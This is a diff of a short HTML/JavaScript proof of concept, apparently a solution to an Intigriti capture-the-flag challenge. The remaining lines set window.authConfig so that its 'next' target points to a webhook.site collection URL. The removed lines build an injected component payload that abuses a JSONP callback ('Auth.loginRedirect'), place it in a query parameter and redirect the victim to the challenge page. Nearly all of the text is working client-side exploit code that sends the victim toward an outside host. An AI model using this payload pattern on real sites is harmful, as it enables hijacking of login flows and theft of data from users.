@@ -1,25 +1,6 @@
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-// Set authConfig
 window.authConfig = {
     dataset: {
         next: 'https://webhook.site/c8d74494-ff22-4327-9e95-5c9738728d6e/',
         append: 'true'
     }
 };
-
-// Component payload
-const payload = '<div data-component="true" data-config=\'{"path":"/","type":"api/stats?callback=Auth.loginRedirect"}\'>x</div>';
-
-// Build URL
-const url = new URL('https://challenge-0326.intigriti.io/challenge.html');
-url.searchParams.set('q', payload);
-url.searchParams.set('domain', 'internal');
-
-// Redirect
-window.location = url.toString();
-</script>
-</body>
-</html>
